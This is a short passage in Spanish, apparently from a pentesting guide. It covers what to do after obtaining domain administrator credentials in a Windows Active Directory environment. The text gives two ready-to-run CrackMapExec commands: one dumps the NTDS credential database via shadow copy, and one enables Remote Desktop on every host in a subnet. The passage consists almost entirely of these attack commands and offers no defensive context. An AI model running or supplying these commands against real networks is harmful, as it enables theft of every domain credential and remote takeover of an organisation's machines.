En este caso tenemos un gran repertorio de acciones a realizar, realmente si ya tenemos estas credenciales ya hemos pwneado prácticamente todo el entorno empresarial, pero es importante saber como podemos usar esto, para esto tenemos las siguientes opciones (Ordenadas en prioridad):


# Obtener el ntds ( Base de datos del Directorio Activo) 

Para obtener esta base de datos solo tendremos que usar el siguiente comando:

``` ruby
cme smb IP_DEL_DIRECTORIOACTIVO -u 'Administrador' -p 'P@$$w0rd!!' --ntds vss
```


# Activar el RDP (Remote Desktop Protocol) en todos los dispositivos

Esto nos permite conectarnos de forma remota a cualquier dispositivo, para ello solo tenemos que usar el siguiente comando:

``` ruby
cme smb 192.168.159.0/24 -u 'Administrador' -p 'P@$$w0rd!!' -M rdp -o action=enable
```

